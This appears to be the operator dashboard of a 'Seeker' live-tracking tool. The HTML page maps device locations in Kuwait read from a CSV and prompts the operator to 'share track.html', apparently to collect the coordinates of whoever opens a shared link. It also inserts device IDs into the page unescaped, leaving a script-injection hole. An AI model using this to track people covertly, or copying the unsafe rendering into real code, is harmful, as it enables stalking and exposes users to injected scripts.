<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
  <title>Seeker · Live Tracking</title>
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/leaflet@1.9.4/dist/leaflet.css" />
  <script src="https://cdn.jsdelivr.net/npm/leaflet@1.9.4/dist/leaflet.js"></script>
  <style>
    :root { --bg: #0e1117; --panel: #161b22; --panel-2: #1c2430; --border: #2a3441; --text: #e6edf3; --muted: #8b949e; --accent: #2f81f7; --success: #3fb950; --error: #ef4444; --danger: #da3633; }
    * { box-sizing: border-box; margin: 0; padding: 0; -webkit-tap-highlight-color: transparent; }
    html, body { height: 100%; overflow: hidden; }
    body { font-family: -apple-system, BlinkMacSystemFont, "SF Pro Display", sans-serif; background: var(--bg); color: var(--text); display: grid; grid-template-columns: 360px 1fr; }
    #sidebar { background: var(--panel); border-right: 1px solid var(--border); display: flex; flex-direction: column; height: 100vh; overflow: hidden; }
    header { padding: 14px 18px; border-bottom: 1px solid var(--border); display: flex; align-items: center; gap: 10px; flex-shrink: 0; }
    header .dot { width: 8px; height: 8px; border-radius: 50%; background: var(--success); box-shadow: 0 0 10px var(--success); animation: pulse 2s infinite; }
    @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.7; } }
    header h1 { font-size: 16px; font-weight: 600; }
    .stats { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; padding: 14px 18px; border-bottom: 1px solid var(--border); flex-shrink: 0; }
    .stat { background: var(--panel-2); border: 1px solid var(--border); border-radius: 10px; padding: 12px; text-align: center; }
    .stat .label { font-size: 11px; color: var(--muted); text-transform: uppercase; margin-bottom: 4px; }
    .stat .value { font-size: 22px; font-weight: 700; }
    .toolbar { display: flex; gap: 8px; padding: 12px 18px; border-bottom: 1px solid var(--border); flex-shrink: 0; }
    .btn { background: var(--accent); color: #fff; border: none; border-radius: 8px; padding: 8px 14px; font-size: 13px; font-weight: 600; cursor: pointer; }
    .btn.ghost { background: transparent; border: 1px solid var(--border); }
    #deviceList { flex: 1; overflow-y: auto; padding: 12px 18px; min-height: 0; }
    .device-card { background: var(--panel-2); border: 1px solid var(--border); border-radius: 10px; padding: 14px; margin-bottom: 10px; cursor: pointer; transition: all 0.2s; }
    .device-card:hover { border-color: var(--accent); transform: translateX(4px); }
    .device-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 8px; }
    .device-name { font-weight: 600; font-size: 14px; display: flex; align-items: center; gap: 8px; flex: 1; }
    .device-dot { width: 10px; height: 10px; border-radius: 50%; }
    .device-actions { display: flex; gap: 6px; }
    .action-btn { background: transparent; border: 1px solid var(--border); color: var(--muted); width: 28px; height: 28px; border-radius: 6px; cursor: pointer; font-size: 14px; display: flex; align-items: center; justify-content: center; }
    .action-btn:hover { background: var(--panel); color: var(--text); }
    .action-btn.delete:hover { background: var(--danger); color: #fff; border-color: var(--danger); }
    .device-meta { font-size: 12px; color: var(--muted); line-height: 1.7; }
    .device-meta b { color: var(--text); }
    .empty { text-align: center; color: var(--muted); padding: 40px 20px; }
    #map { height: 100vh; }
    .status-bar { padding: 10px 18px; border-top: 1px solid var(--border); font-size: 12px; color: var(--muted); text-align: center; flex-shrink: 0; }
    .status-bar b { color: var(--success); }
    @media (max-width: 768px) { body { grid-template-columns: 1fr; grid-template-rows: 45vh 55vh; } #sidebar { border-right: none; border-bottom: 1px solid var(--border); } #map { height: 55vh; } }
  </style>
</head>
<body>
  <div id="sidebar">
    <header><div class="dot"></div><h1>Seeker · Live Tracking</h1></header>
    <div class="stats">
      <div class="stat"><div class="label">Devices</div><div class="value" id="deviceCount">0</div></div>
      <div class="stat"><div class="label">Located</div><div class="value" id="locatedCount">0</div></div>
    </div>
    <div class="toolbar">
      <button class="btn ghost" onclick="fitMap()">Fit</button>
      <button class="btn" onclick="loadDevices()">Refresh</button>
    </div>
    <div id="deviceList"><div class="empty">Loading...</div></div>
    <div class="status-bar">Updated: <b id="lastUpdate">--:--:--</b> · Auto-refresh 10s</div>
  </div>
  <div id="map"></div>

  <script>
    const COLORS = ['#3b82f6', '#ef4444', '#22c55e', '#f97316', '#a855f7', '#ec4899', '#14b8a6', '#06b6d4'];
    let map, markers = {}, devices = [];
    
    function initMap() {
      map = L.map('map').setView([29.3759, 47.9774], 10);
      L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', { attribution: '© OpenStreetMap' }).addTo(map);
    }
    
    async function loadDevices() {
      try {
        const url = 'db/results.csv?t=' + Date.now();
        const res = await fetch(url, { cache: 'no-store' });
        if (!res.ok) throw new Error('HTTP ' + res.status);
        
        const text = await res.text();
        const lines = text.trim().split('\n');
        
        console.log('CSV loaded:', lines.length, 'lines');
        
        // Group by device_id, keep latest for each
        const deviceMap = new Map();
        
        lines.forEach(line => {
          const cols = line.split(',');
          if (cols.length < 4) return;
          
          // Format: timestamp(0), device_id(1), lat(2), lon(3), accuracy(4), speed(5)
          const timestamp = cols[0].replace(/"/g, '').trim();
          const deviceId = cols[1].replace(/"/g, '').trim();
          const lat = parseFloat(cols[2]);
          const lon = parseFloat(cols[3]);
          const acc = parseFloat(cols[4]) || 0;
          
          console.log('Parsed:', { timestamp, deviceId, lat, lon, acc });
          
          // Validate (Kuwait area: 28-31°N, 46-49°E)
          if (lat > 28 && lat < 31 && lon > 46 && lon < 49 && !isNaN(lat) && !isNaN(lon)) {
            // Keep latest entry per device
            if (!deviceMap.has(deviceId) || timestamp > deviceMap.get(deviceId).timestamp) {
              deviceMap.set(deviceId, { deviceId, lat, lon, acc, timestamp });
            }
          }
        });
        
        devices = Array.from(deviceMap.values());
        console.log('Devices found:', devices.length);
        updateUI();
      } catch (e) {
        console.error('Load failed:', e);
        document.getElementById('deviceList').innerHTML = '<div class="empty">Error: ' + e.message + '</div>';
      }
    }
    
    function updateUI() {
      document.getElementById('deviceCount').textContent = devices.length;
      document.getElementById('locatedCount').textContent = devices.filter(d => d.lat).length;
      document.getElementById('lastUpdate').textContent = new Date().toLocaleTimeString();
      
      const list = document.getElementById('deviceList');
      if (devices.length === 0) {
        list.innerHTML = '<div class="empty">No devices yet. Share track.html!</div>';
        return;
      }
      
      list.innerHTML = '';
      devices.forEach((device, i) => {
        const color = COLORS[i % COLORS.length];
        const card = document.createElement('div');
        card.className = 'device-card';
        // Click card → Google Maps navigation
        card.onclick = (e) => {
          // Don't navigate if clicking delete button
          if (e.target.closest('.action-btn')) return;
          openGoogleMaps(device.lat, device.lon, device.deviceId);
        };
        card.innerHTML = `
          <div class="device-header">
            <span class="device-name"><span class="device-dot" style="background:${color}"></span>${device.deviceId}</span>
            <div class="device-actions">
              <button class="action-btn" onclick="event.stopPropagation(); openGoogleMaps('${device.lat}', '${device.lon}', '${device.deviceId}')" title="Navigate">🧭</button>
              <button class="action-btn delete" onclick="event.stopPropagation(); deleteDevice('${device.deviceId}')" title="Delete">🗑️</button>
            </div>
          </div>
          <div class="device-meta">
            <b>${device.lat.toFixed(5)}, ${device.lon.toFixed(5)}</b><br>
            Accuracy: ${Math.round(device.acc)}m<br>
            Updated: ${device.timestamp}
          </div>
        `;
        list.appendChild(card);
        updateMarker(device, color, i);
      });
    }
    
    function openGoogleMaps(lat, lon, deviceId) {
      // Open Google Maps with navigation to the device location
      const url = `https://www.google.com/maps/dir/?api=1&destination=${lat},${lon}`;
      const confirmMsg = `Open Google Maps to navigate to ${deviceId}?\n\nLocation: ${lat}, ${lon}`;
      if (confirm(confirmMsg)) {
        window.open(url, '_blank');
      }
    }
    
    async function deleteDevice(deviceId) {
      const confirmMsg = `Delete ${deviceId} from the dashboard?\n\nThis will remove it from the CSV file.`;
      if (!confirm(confirmMsg)) return;
      
      try {
        // Call delete handler
        const res = await fetch('delete_handler.php', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ device_id: deviceId })
        });
        
        if (!res.ok) {
          const err = await res.text();
          throw new Error(err || 'Delete failed');
        }
        
        const result = await res.json();
        alert(result.message || 'Device deleted!');
        loadDevices(); // Refresh list
      } catch (e) {
        alert('Delete failed: ' + e.message);
        console.error('Delete error:', e);
      }
    }
    
    function updateMarker(device, color, index) {
      const id = 'device-' + index;
      if (markers[id]) {
        markers[id].setLatLng([device.lat, device.lon]);
        markers[id].setPopupContent(`<b>${device.deviceId}</b><br>${device.lat.toFixed(5)}, ${device.lon.toFixed(5)}`);
      } else {
        const circle = L.circleMarker([device.lat, device.lon], {
          radius: 12, fillColor: color, color: '#fff', weight: 2, fillOpacity: 0.85
        }).addTo(map);
        circle.bindPopup(`<b>${device.deviceId}</b><br>${device.lat.toFixed(5)}, ${device.lon.toFixed(5)}`);
        markers[id] = circle;
      }
    }
    
    function focusDevice(index) {
      const device = devices[index];
      if (device) {
        map.setView([device.lat, device.lon], 15);
        const marker = markers['device-' + index];
        if (marker) marker.openPopup();
      }
    }
    
    function fitMap() {
      if (devices.length === 0) return;
      map.fitBounds(devices.map(d => [d.lat, d.lon]), { padding: [40, 40] });
    }
    
    setInterval(loadDevices, 10000);
    initMap();
    loadDevices();
  </script>
</body>
</html>
